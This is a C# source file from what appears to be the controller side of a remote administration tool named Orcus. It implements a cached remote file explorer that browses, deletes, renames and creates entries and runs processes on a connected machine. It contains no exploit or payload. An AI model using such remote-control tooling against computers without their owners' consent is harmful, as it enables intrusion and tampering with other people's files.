using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using Orcus.Administration.Commands.FileExplorer;
using Orcus.Administration.Core.Logging;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.Utilities;

namespace Orcus.Administration.ViewModels.CommandViewModels.FileExplorer
{
    public class RemoteFileSystem : IFileSystem
    {
        private readonly FileExplorerCommand _fileExplorerCommand;

        //Tuple bool = true if only directories
        private readonly ConcurrentDictionary<string, EntriesInfo> _cachedEntries;

        public RemoteFileSystem(FileExplorerCommand fileExplorerCommand)
        {
            _fileExplorerCommand = fileExplorerCommand;
            _fileExplorerCommand.ProcessingEntryAdded += FileExplorerCommandOnProcessingEntryAdded;
            _fileExplorerCommand.ProcessingEntryUpdateReceived += FileExplorerCommandOnProcessingEntryUpdateReceived;
            _cachedEntries = new ConcurrentDictionary<string, EntriesInfo>();
            ImageProvider = new ImageProvider();
        }

        private void FileExplorerCommandOnProcessingEntryUpdateReceived(object sender, ProcessingEntryUpdate processingEntryUpdate)
        {
            if (processingEntryUpdate.Progress != 1 && processingEntryUpdate.Progress != -1)
                return;

            if (
                _cachedEntries.TryGetValue(Path.GetDirectoryName(processingEntryUpdate.Path).NormalizePath(),
                    out var cachedEntry) && !cachedEntry.DirectoriesOnly)
            {
                lock (cachedEntry)
                {
                    var entry =
                        cachedEntry.Entries.FirstOrDefault(x => x.Path == processingEntryUpdate.Path) as ProcessingEntry;
                    if (entry != null)
                    {
                        cachedEntry.Entries.Remove(entry);
                        if (processingEntryUpdate.Progress == 1)
                            cachedEntry.Entries.Add(entry.ToFileExplorerEntry());
                    }
                }
            }
        }

        private void FileExplorerCommandOnProcessingEntryAdded(object sender, ProcessingEntry processingEntry)
        {
            if (
                _cachedEntries.TryGetValue(Path.GetDirectoryName(processingEntry.Path).NormalizePath(),
                    out var cachedEntry) && !cachedEntry.DirectoriesOnly)
                lock (cachedEntry)
                    cachedEntry.Entries.Add(processingEntry);
        }

        public void AddToCache(DirectoryEntry directoryEntry, List<IFileExplorerEntry> entries, bool directoriesOnly)
        {
            var entriesInfo = new EntriesInfo(entries, directoryEntry, directoriesOnly);
            var path = directoryEntry.Path.NormalizePath();
            if (_cachedEntries.ContainsKey(path))
                _cachedEntries[path] = entriesInfo;
            else
                _cachedEntries.TryAdd(path, entriesInfo);

            DirectoryEntriesUpdated?.Invoke(this,
                new DirectoryEntriesUpdate(directoryEntry.Path, entries, directoriesOnly));
        }

        public Task<List<PackedDirectoryEntry>> GetDirectories(DirectoryEntry directory)
        {
            return GetDirectories(directory, false);
        }

        public async Task<List<PackedDirectoryEntry>> GetDirectories(DirectoryEntry directory, bool ignoreCache)
        {
            if (!ignoreCache && _cachedEntries.TryGetValue(directory.Path.NormalizePath(), out var cachedEntry))
            {
                lock (cachedEntry)
                {
                    if (cachedEntry.DirectoriesOnly)
                        return cachedEntry.Entries.Cast<PackedDirectoryEntry>().ToList();

                    return cachedEntry.Entries.OfType<PackedDirectoryEntry>().ToList();
                }
            }

            var entries = await Task.Run(() => _fileExplorerCommand.GetDirectories(directory.Path));

            foreach (var entry in entries)
                entry.Unpack(directory);

            AddToCache(directory, entries.Cast<IFileExplorerEntry>().ToList(), true);
            return entries;
        }

        public Task<PathContent> RequestPathContent(string path)
        {
            return RequestPathContent(path, false, false);
        }

        private bool ContainsEntryWithFiles(string path, out List<IFileExplorerEntry> entries)
        {
            EntriesInfo cachedEntry;
            entries = null;
            if (_cachedEntries.TryGetValue(path.NormalizePath(), out cachedEntry))
            {
                if (!cachedEntry.DirectoriesOnly)
                {
                    entries = cachedEntry.Entries;
                    return true;
                }
            }

            return false;
        }

        public Task<PathContent> RequestPathContent(string path, bool ignoreCache)
        {
            return RequestPathContent(path, ignoreCache, ignoreCache);
        }

        private static string FixVolumeLabel(string path)
        {
            if (path.Length == 2 && path[1] == ':')
                return path + "\\"; //Volume Label, we add a slash because some systems (Windows XP) can't handle "C:"
            return path;
        }

        public async Task<PathContent> RequestPathContent(string path, bool ignoreCache, bool pathIgnoreCache)
        {
            if (Environment.ExpandEnvironmentVariables(path) != path)
            {
                var oldPath = path;
                path = await Task.Run(() => _fileExplorerCommand.ExpandEnvironmentVariables(oldPath));
            }

            var currentPath = path.TrimEnd('\\');
            var fixedPath = FixVolumeLabel(currentPath);
            var directoriesToRequest = new List<string>();
            var parts = new List<string> {fixedPath};
            var requestFirstAllEntries = false;

            if (pathIgnoreCache || !ContainsEntryWithFiles(path, out var cachedEntries))
            {
                directoriesToRequest.Add(fixedPath);
                requestFirstAllEntries = true;
            }

            while (true)
            {
                var lastIndex = currentPath.LastIndexOf('\\');
                if (lastIndex == -1)
                    break;

                currentPath = currentPath.Substring(0, lastIndex);
                fixedPath = FixVolumeLabel(currentPath);
                parts.Add(fixedPath);

                if (ignoreCache || (pathIgnoreCache && currentPath == path) ||
                    !_cachedEntries.ContainsKey(currentPath.NormalizePath()))
                    directoriesToRequest.Add(fixedPath);
            }

            List<List<IFileExplorerEntry>> entries = null;
            if (directoriesToRequest.Count > 0)
                entries =
                    await
                        Task.Run(() => _fileExplorerCommand.GetPathContent(directoriesToRequest, requestFirstAllEntries));

            DirectoryEntry directory = null;
            List<IFileExplorerEntry> directoryEntries = null;
            var pathEntries = new List<DirectoryEntry>();

            for (int i = parts.Count - 1; i >= 0; i--)
            {
                var directoryPath = parts[i];

                if (directory == null)
                {
                    EntriesInfo entriesInfo;
                    if (_cachedEntries.TryGetValue(directoryPath.NormalizePath(), out entriesInfo))
                        directory = entriesInfo.DirectoryEntry;
                    else
                    {
                        var computerCachedEntry = _cachedEntries.First().Value;
                        directory =
                            computerCachedEntry.Entries.OfType<DirectoryEntry>().FirstOrDefault(
                                x => string.Equals(x.Path, directoryPath, StringComparison.OrdinalIgnoreCase));
                    }
                }

                if (directory == null) //Special folders like trash can etc.
                {
                    directory = await Task.Run(() => _fileExplorerCommand.GetDirectory(directoryPath));
                    directory.Unpack(null);
                }

                if (directoriesToRequest.Contains(parts[i]))
                {
                    //get the entries of that part from the response

                    directoryEntries = entries[directoriesToRequest.IndexOf(directoryPath)];

                    foreach (var fileExplorerEntry in directoryEntries)
                        fileExplorerEntry.Unpack(directory);

                    AddToCache(directory, directoryEntries, i != 0);
                }
                else
                {
                    directoryEntries = _cachedEntries[directoryPath.NormalizePath()].Entries;
                }

                pathEntries.Add(directory);

                if (i > 0)
                {
                    DirectoryEntry nextDirectoryEntry = null;
                    foreach (var directoryEntry in directoryEntries.OfType<DirectoryEntry>())
                    {
                        if (string.Equals(directoryEntry.Path, parts[i - 1], StringComparison.OrdinalIgnoreCase))
                        {
                            nextDirectoryEntry = directoryEntry;
                            break;
                        }
                    }

                    if (nextDirectoryEntry == null)
                    {
                        var name = GetDirectoryName(parts[i - 1]);
                        var entry = new DirectoryEntry
                        {
                            HasSubFolder = true,
                            Path = parts[i - 1],
                            Parent = directory,
                            Name = name,
                            Label = name
                        };
                        directoryEntries.Add(entry);
                        nextDirectoryEntry = entry;
                    }

                    directory = nextDirectoryEntry;
                }
            }

            return new PathContent(directory, directoryEntries, pathEntries);
        }

        private string GetDirectoryName(string path)
        {
            try
            {
                return new DirectoryInfo(path).Name;
            }
            catch (Exception)
            {
                var pos = path.LastIndexOf('\\');
                if (pos == -1)
                    return path;
                return path.Substring(pos + 1);
            }
        }

        public async Task<EntryDeletionFailed> Remove(IFileExplorerEntry fileExplorerEntry)
        {
            return (await Remove(new[] {fileExplorerEntry})).FirstOrDefault();
        }

        public async Task<List<EntryDeletionFailed>> Remove(IEnumerable<IFileExplorerEntry> fileExplorerEntries)
        {
            var entriesToRemove = fileExplorerEntries.ToList();
            var failedEntryList = await Task.Run(() => _fileExplorerCommand.RemoveEntries(entriesToRemove));
            var failedList = new List<EntryDeletionFailed>();

            for (int i = 0; i < entriesToRemove.Count; i++)
            {
                var result = failedEntryList[i];
                var entry = entriesToRemove[i];

                if (result == null)
                {
                    foreach (var cachedEntry in _cachedEntries)
                        lock (cachedEntry.Value)
                            cachedEntry.Value.Entries.Remove(entry);

                    FileExplorerEntryRemoved?.Invoke(this, entry);

                    foreach (var cachedEntry in _cachedEntries.Where(x => x.Key.StartsWith(entry.Path, StringComparison.OrdinalIgnoreCase)).ToList())
                        _cachedEntries.TryRemove(cachedEntry.Key, out var foo);
                }
                else
                {
                    failedList.Add(new EntryDeletionFailed(result, entry));
                }
            }

            if (failedList.Count > 0)
            {
                var actuallyDeletedEntries =
                    entriesToRemove.Where(x => !failedList.Any(y => y.Entry.Equals(x))).ToList();

                string message;
                //entries failed
                if (actuallyDeletedEntries.Count == 0 && failedList.Count > 1)
                    message = string.Format((string) Application.Current.Resources["EntriesFailed"], failedList.Count);
                //entry failed
                else if (actuallyDeletedEntries.Count == 0 && failedList.Count == 1)
                    message = (string) Application.Current.Resources["EntryFailed"];
                //entry deleted, entry failed
                else if (actuallyDeletedEntries.Count == 1 && failedList.Count == 1)
                    message = (string) Application.Current.Resources["EntryDeletedEntryFailed"];
                //entry deleted, entries failed
                else if (actuallyDeletedEntries.Count == 1 && failedList.Count > 1)
                    message = string.Format((string) Application.Current.Resources["EntryDeletedEntriesFailed"],
                        failedList.Count);
                //entries deleted, entry failed
                else if (actuallyDeletedEntries.Count > 1 && failedList.Count == 1)
                    message = string.Format((string) Application.Current.Resources["EntriesDeletedEntryFailed"],
                        actuallyDeletedEntries.Count);
                //entries deleted, entries failed
                else // if (actuallyDeletedEntries.Count > 1 && failedList.Count > 1)
                    message = string.Format((string) Application.Current.Resources["EntriesDeletedEntriesFailed"],
                        actuallyDeletedEntries.Count, failedList.Count);

                Logger.Error(message);
            }
            else
            {
                string message;
                if (entriesToRemove.Count == 1)
                    message = (string) Application.Current.Resources["EntryDeleted"];
                else
                    message = string.Format((string) Application.Current.Resources["EntriesDeleted"],
                        entriesToRemove.Count);
                Logger.Receive(message);
            }

            return failedList;
        }

        public async Task Rename(IFileExplorerEntry fileExplorerEntry, string newName)
        {
            await Task.Run(() => _fileExplorerCommand.RenameEntry(fileExplorerEntry, newName));
            var newPath = Path.Combine(Path.GetDirectoryName(fileExplorerEntry.Path), newName);
            var oldPath = fileExplorerEntry.Path;
            FileExplorerEntryRenamed?.Invoke(this, new EntryRenamedInfo(fileExplorerEntry, newName, newPath));
            fileExplorerEntry.Name = newName;

            foreach (var cachedEntry in _cachedEntries.Where(x => x.Key.StartsWith(oldPath, StringComparison.OrdinalIgnoreCase)).ToList())
            {
                _cachedEntries.TryRemove(cachedEntry.Key, out var foo);
                var newKey = newPath + cachedEntry.Key.Substring(oldPath.Length);
                cachedEntry.Value.DirectoryEntry.Path = newKey;
                lock (cachedEntry.Value)
                    foreach (var explorerEntry in cachedEntry.Value.Entries)
                        explorerEntry.Path = newPath + explorerEntry.Path.Substring(oldPath.Length);

                if (_cachedEntries.ContainsKey(newKey))
                    _cachedEntries[newKey] = cachedEntry.Value;
                else
                    _cachedEntries.TryAdd(newKey, cachedEntry.Value);
            }
            fileExplorerEntry.Path = newPath;
        }

        public async Task CreateFolder(string folderPath)
        {
            await Task.Run(() => _fileExplorerCommand.CreateFolder(folderPath));
            var parentFolder = Path.GetDirectoryName(folderPath);

            var entry = new PackedDirectoryEntry
            {
                CreationTime = DateTime.Now,
                HasSubFolder = false,
                Name = new DirectoryInfo(folderPath).Name,
                Path = folderPath
            };

            if (parentFolder != null && _cachedEntries.TryGetValue(parentFolder.NormalizePath(), out var entriesInfo))
            {
                entry.Parent = entriesInfo.DirectoryEntry;
                entriesInfo.DirectoryEntry.HasSubFolder = true;

                lock (entriesInfo)
                    entriesInfo.Entries.Add(entry);
                FileExplorerEntryAdded?.Invoke(this, new EntryAddedInfo(entry, entriesInfo.DirectoryEntry.Path));
            }
            else
            {
                FileExplorerEntryAdded?.Invoke(this, new EntryAddedInfo(entry, parentFolder));
            }
        }

        public async Task CreateShortcut(string path, ShortcutInfo shortcutInfo)
        {
            await Task.Run(() => _fileExplorerCommand.CreateShortcut(path, shortcutInfo));

            var parentFolder = Path.GetDirectoryName(path);
            EntriesInfo entriesInfo;
            var newEntry = new FileEntry
            {
                CreationTime = DateTime.Now,
                Name = Path.GetFileName(path),
                Path = path,
                Size = 0
            };

            if (_cachedEntries.TryGetValue(parentFolder.NormalizePath(), out entriesInfo))
            {
                newEntry.Parent = entriesInfo.DirectoryEntry;
                lock (newEntry)
                    entriesInfo.Entries.Add(newEntry);
            }

            FileExplorerEntryAdded?.Invoke(this, new EntryAddedInfo(newEntry, parentFolder));
        }

        public Task ExecuteFile(string path, string arguments, string verb, bool createNoWindow)
        {
            return Task.Run(() => _fileExplorerCommand.ExecuteProcess(path, arguments, verb, createNoWindow));
        }

        public ImageProvider ImageProvider { get; }
        public event EventHandler<IFileExplorerEntry> FileExplorerEntryRemoved;
        public event EventHandler<EntryRenamedInfo> FileExplorerEntryRenamed;
        public event EventHandler<EntryAddedInfo> FileExplorerEntryAdded;
        public event EventHandler<DirectoryEntriesUpdate> DirectoryEntriesUpdated;
    }

    public class EntriesInfo
    {
        public EntriesInfo(List<IFileExplorerEntry> entries, DirectoryEntry directoryEntry, bool directoriesOnly)
        {
            Entries = entries;
            DirectoriesOnly = directoriesOnly;
            DirectoryEntry = directoryEntry;
        }

        public DirectoryEntry DirectoryEntry { get; }
        public bool DirectoriesOnly { get;}
        public List<IFileExplorerEntry> Entries { get; }
    }
}